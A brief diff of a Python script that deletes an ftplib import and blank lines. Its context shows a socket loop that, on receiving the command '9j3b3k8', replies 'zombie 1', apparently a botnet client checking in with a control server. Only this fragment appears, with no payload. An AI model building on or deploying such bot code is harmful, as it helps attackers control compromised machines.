@@ -1,5 +1,4 @@
 import os
-from ftplib import *
 import sys
 import socket
 import time
@@ -22,6 +21,4 @@ while True:
     if srv_cmd == "9j3b3k8":
         srv_cmd = ""
         s.send("zombie 1")
-
-
         break
